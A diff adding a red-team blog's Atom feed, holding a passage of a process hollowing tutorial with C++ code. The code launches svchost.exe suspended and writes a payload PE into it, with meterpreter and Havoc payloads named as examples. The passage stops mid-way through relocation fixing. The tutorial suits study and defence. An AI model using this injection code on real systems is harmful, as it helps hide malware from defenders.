@@ -1,0 +1,1342 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-05T09:17:22+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Red Team SNCF</title><subtitle></subtitle><author><name>Red Team SNCF</name></author><entry><title type="html">How to perform a Complete Process Hollowing</title><link href="http://localhost:4000/complete-process-hollowing.html" rel="alternate" type="text/html" title="How to perform a Complete Process Hollowing" /><published>2024-01-24T10:00:00+01:00</published><updated>2024-01-24T10:00:00+01:00</updated><id>http://localhost:4000/complete-process-hollowing</id><content type="html" xml:base="http://localhost:4000/complete-process-hollowing.html"><![CDATA[<h1 id="how-to-perform-a-complete-process-hollowing">How to perform a Complete Process Hollowing</h1>
+
+<h2 id="table-of-content">Table of Content</h2>
+
+<ul>
+  <li><a href="#abstract">Abstract</a></li>
+  <li><a href="#basic-process-hollowing">Basic Process Hollowing</a>
+    <ul>
+      <li><a href="#definition">Definition</a></li>
+      <li><a href="#start-a-suspended-process">Start a suspended process</a></li>
+      <li><a href="#loadpe-and-retrieve-nt-headers">LoadPE and Retrieve NT Headers</a></li>
+      <li><a href="#allocate-memory">Allocate Memory</a></li>
+      <li><a href="#copy-pe-in-target-process">Copy PE in target process</a></li>
+      <li><a href="#image-base-relocation">Image base Relocation</a></li>
+      <li><a href="#changing-the-entrypoint-and-resuming-the-execution">Changing the entrypoint and resuming the execution</a></li>
+    </ul>
+  </li>
+  <li><a href="#make-the-remote-process-load-the-required-libraries">Make the remote process load the required libraries</a>
+    <ul>
+      <li><a href="#load-an-arbitrary-dll-in-a-remote-process">Load an arbitrary DLL in a remote process</a></li>
+      <li><a href="#resolve-injected-pe-iat-to-make-the-remote-process-load-all-the-dependencies">Resolve injected PE IAT to make the remote process load all the dependencies</a></li>
+      <li><a href="#resolve-the-functions-and-libraries-addresses-on-the-remote-process">Resolve the functions and libraries addresses on the remote process</a></li>
+      <li><a href="#retrieve-the-libraries-and-function-addresses">Retrieve the libraries and function addresses</a></li>
+    </ul>
+  </li>
+  <li><a href="#handle-forwarded-functions-on-remote-process">Handle forwarded functions on remote process</a>
+    <ul>
+      <li><a href="#definition-of-a-forwarded-function">Definition of a forwarded function</a></li>
+      <li><a href="#custom-getprocaddress">Custom GetProcAddress</a></li>
+    </ul>
+  </li>
+  <li><a href="#handle-api-set">Handle API set</a>
+    <ul>
+      <li><a href="#definition-of-api-sets">Definition of API Sets</a></li>
+      <li><a href="#how-to-resolve-api-set-names">How to resolve API set names</a></li>
+    </ul>
+  </li>
+  <li><a href="#final-touch-retrieve-output-of-our-injected-process">Final Touch: Retrieve output of our injected process</a></li>
+  <li><a href="#plot-twist">Plot Twist</a></li>
+  <li><a href="#references">References</a></li>
+</ul>
+
+<h2 id="abstract">Abstract</h2>
+
+<p>When someone is interested  in code injection, he encounters Process Hollowing technic which consists in creating a remote process in a suspended state, write a payload in the remote process memory and overwrite the address of entry point with the address of the payload. A lot of articles on internet explain really well how the technique works and how to implement it in C/C++ using a PE as a payload.</p>
+
+<p>However, all the articles about this technique lack one specific thing: handling the import table of the injected PE. When Local Reflective Execution is performed, it is just needed to iterate over the IAT and delayed IAT to import the needed libraries and resolve the required functions to fix the tables. The purpose of this blog post is to demonstrate how it is possble to fix the IAT and delayed IAT remotely when a PE is injected on a remote process.</p>
+
+<p>This article does not show a new evasion technic but an improvement of an old technic used to inject PE in a remote process.</p>
+
+<h2 id="basic-process-hollowing">Basic Process Hollowing</h2>
+
+<p>This first section is a reminder of how to implement basic process hollowing with a PE without any IAT such as a meterpreter or Havoc payload. The article will not go into deep details about the basic process hollowing process since there are a lot of articles which explains better the technic. I suggest to read the article from <a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations">ired.team about process hollowing</a> if you want to have more details about the basics.<br />
+For people who already knows about the process hollowing, I suggest to directly jump to <a href="#make-the-remote-process-load-the-required-libraries">Make the remote process load the libraries required
+</a> chapter.</p>
+
+<h3 id="definition">Definition</h3>
+
+<p>Process Hollowing is an injection technique that injects PE payloads into the address space of a remote process. The remote process is often a legitimate process created by the process hollowing implementation.</p>
+
+<p>A typical process hollowing implementation generally creates a suspended process via the CreateProcess WinAPI and then calls NtUnmapViewOfSection to unmap the legitimate process image of the remote process. Once that’s done, NtMapViewOfSection is called to map the PE payload’s binary image instead.</p>
+
+<p><img src="assets/img/posts/20240124/ProcessHollowSchema.png" alt="Process Hollowing" /></p>
+
+<h3 id="start-a-suspended-process">Start a suspended process</h3>
+
+<p>The first step is pretty straightforward. It is to create a process in a suspended state. The process needs to have the same architecture as the PE that we want to inject.(x64 PE on x64 process, x86 PE on x86 process, etc.). For the blog post the executable that will be used as the legitimate process will be <code class="language-plaintext highlighter-rouge">svchost.exe</code>.<br />
+To create the process, the WinAPI function <code class="language-plaintext highlighter-rouge">CreateProcessA</code> will be used. A little function, which will juste take as arguments, our process name that we want to execute and a pointer to a process information struct which will be initialiazed by the function <code class="language-plaintext highlighter-rouge">CreateProcessA</code>, will be created. The process information structure <code class="language-plaintext highlighter-rouge">pi</code> is used to retrieve the process handle and the main thread handle.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">launchSuspendedProcess</span><span class="p">(</span><span class="n">LPCSTR</span> <span class="n">processName</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// init an empty STARTUP INFO structure required by the function CreateProcessA 
+</span>
+    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="n">pi</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot create process %s"</span><span class="p">,</span> <span class="n">processName</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Launching process %s with PID: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="n">LPCSTR</span> <span class="n">target</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">svchost.exe"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">launchSuspendedProcess</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<h3 id="loadpe-and-retrieve-nt-headers">LoadPE and Retrieve NT Headers</h3>
+
+<p>For the article, a function to read a PE file from disk and to load it in a byte array is used. Alternatives can be done such as:</p>
+<ul>
+  <li>embed the PE as a byte array in our code</li>
+  <li>retrieve the PE remotely from a web server</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">loadPEFromDisk</span><span class="p">(</span><span class="n">LPCSTR</span> <span class="n">peName</span><span class="p">,</span> <span class="n">LPVOID</span><span class="o">&amp;</span> <span class="n">peContent</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">peSizeReturn</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hPe</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">hPe</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">peName</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hPe</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="o">!</span><span class="n">hPe</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] Error PE to load does not exist or not enough permission to read file: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="o">*</span><span class="n">peSizeReturn</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hPe</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] DLL %s loaded</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">peName</span><span class="p">);</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] DLL size: %lu bytes </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">peSizeReturn</span><span class="p">);</span>
+
+    <span class="n">peContent</span> <span class="o">=</span> <span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="o">*</span><span class="n">peSizeReturn</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">peContent</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR in allocating in HEAP</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hPe</span><span class="p">,</span> <span class="n">peContent</span><span class="p">,</span> <span class="o">*</span><span class="n">peSizeReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR copying Dll in HEAP </span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Allocating size of Dll on the HEAP @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">peContent</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPe</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR in closing Handle on file %s"</span><span class="p">,</span> <span class="n">peName</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>To perform process hollowing, the injected PE NT Header is needed. <br />
+For those who are unfamiliar with PE format, it is suggested to read the really good <a href="https://0xrick.github.io/win-internals/pe1/">serie of articles by 0xrick</a>.</p>
+
+<p>Here a simple function to retrieve the NT Header from the injected PE content.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">retrieveNtHeader</span><span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="o">&amp;</span> <span class="n">ntHeader</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peContent</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">peContent</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dosHeaders</span><span class="o">-&gt;</span><span class="n">e_magic</span> <span class="o">!=</span> <span class="n">IMAGE_DOS_SIGNATURE</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Input file seems to not be a PE</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">ntHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">dosHeaders</span> <span class="o">+</span> <span class="n">dosHeaders</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Dos Header: 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dosHeaders</span><span class="o">-&gt;</span><span class="n">e_magic</span><span class="p">);</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] NT headers: 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntHeader</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<h3 id="allocate-memory">Allocate Memory</h3>
+
+<p>Once the suspended process is created and the NT Header retrieved, we need to allocate memory on the remote process to store the payload.<br />
+The size of the injected PE image will be used to allocate memory.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>  <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allocAddrOnTarget</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_err</span><span class="p">(</span><span class="s">"Error in allocating memory on target process: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Once the memory has been allocated, it is required to compute the offset between the allocation address and the preferred Image Base Address of the PE contained in the OptionalHeaders. This offset will be used to patch the binary during the relocation phase.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">DWORD64</span> <span class="n">DeltaImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">-</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">;</span></code></pre></figure>
+
+<p>On most articles, the allocation is performed on the Image base Address of the legitimate process after beeing unmapped. However it has been preferred to not touch the original memory of process and let the operating system decide where the allocation will be made because, to load missing libraries of the injected PE into the remote process, it is needed to create remote threads. The process crashes when we attempt to create a remote thread when the remote process Image is unmapped. Therefore, it is needed to let untouched the original Image.</p>
+
+<h3 id="copy-pe-in-target-process">Copy PE in target process</h3>
+
+<p>Once the memory has been allocated, it is possible to copy our PE in the target process.<br />
+In a first time, it is required to update the ImageBase address in the NT Header with the address of the allocated memory. Once done, the injected PE headers will be copied  in our newly allocated memory.<br />
+Then, by iterating over the section headers the content of the sections will be copied inside the allocated memory.<br />
+During the relocation phase, the <code class="language-plaintext highlighter-rouge">.reloc</code> section header will be needed, therefore the function that will copy the injected PE will return the section header.<br />
+Finaly, the function will change the permission on the <code class="language-plaintext highlighter-rouge">.text</code> section to make it executable.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">copyPEinTargetProcess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">LPVOID</span><span class="o">&amp;</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">peInjectNtHeader</span><span class="p">,</span> <span class="n">PIMAGE_SECTION_HEADER</span><span class="o">&amp;</span> <span class="n">peToInjectRelocSection</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">;</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing Header into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Headers written at : 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">);</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing section into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">currentSectionHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)((</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">peInjectNtHeader</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_FILE_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">SizeOfOptionalHeader</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)));</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".reloc"</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">peToInjectRelocSection</span> <span class="o">=</span> <span class="n">currentSectionHeader</span><span class="p">;</span>
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Reloc table found @ 0x%p offset</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">UINT64</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Section %s written at : 0x%p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">));</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".text"</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">_err</span><span class="p">(</span><span class="s">"Error in changing permissions on .text sections to RX -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Permissions changed to RX on .text section </span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/CopyPEOutput.png" alt="Copy of PE in the remote process" /></p>
+
+<h3 id="image-base-relocation">Image base Relocation</h3>
+
+<p>Since the PE was loaded to a different address of the image base address referenced in the NT header, it needs to be patched in order for the binary to resolve addresses of different objects like static variables and other absolute addresses which otherwise would no longer work. The way the windows loader knows how to patch the images in memory is by referring to a relocation table residing in the binary.</p>
+
+<p>The process of the relocation phase is:</p>
+<ul>
+  <li>finding the relocation table and cycling through the relocation blocks</li>
+  <li>getting the number of required relocations in each relocation block</li>
+  <li>reading bytes in the specified relocation addresses</li>
+  <li>applying delta (between source and destination imageBaseAddress) to the values specified in the relocation addresses</li>
+  <li>writing the new values at specified relocation addresses</li>
+  <li>repeating the above until the entire relocation table is traversed</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">fixRelocTable</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="n">LPVOID</span><span class="o">&amp;</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">DeltaImageBase</span><span class="p">,</span> <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">relocationTable</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Fixing relocation table.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">peToInjectRelocSection</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"No Reloc Table</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">DWORD</span> <span class="n">RelocOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">RelocOffset</span> <span class="o">&lt;</span> <span class="n">relocationTable</span><span class="p">.</span><span class="n">Size</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">PBASE_RELOCATION_BLOCK</span> <span class="n">currentReloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBASE_RELOCATION_BLOCK</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">peToInjectRelocSection</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">RelocOffset</span><span class="p">);</span>
+        <span class="n">RelocOffset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_BASE_RELOCATION</span><span class="p">);</span>
+        <span class="n">DWORD</span> <span class="n">NumberOfEntries</span> <span class="o">=</span> <span class="p">(</span><span class="n">currentReloc</span><span class="o">-&gt;</span><span class="n">BlockSize</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_BASE_RELOCATION</span><span class="p">))</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">BASE_RELOCATION_ENTRY</span><span class="p">);</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Number of relocation: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">NumberOfEntries</span><span class="p">);</span>
+
